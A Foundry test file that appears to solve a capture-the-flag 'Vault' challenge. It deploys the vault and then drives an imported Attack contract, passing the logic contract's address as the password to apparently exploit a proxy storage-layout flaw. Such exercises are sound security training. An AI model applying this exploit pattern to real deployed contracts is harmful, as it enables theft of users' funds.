// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attack.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        // add your hacker code. 
        Attack attack = new Attack(payable(address(vault)));
        (bool success,) = payable(address(attack)).call{value:0.1 ether}("");
        require(success,"transfer failed");
        attack.attack(bytes32(uint(uint160(address(logic)))));
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
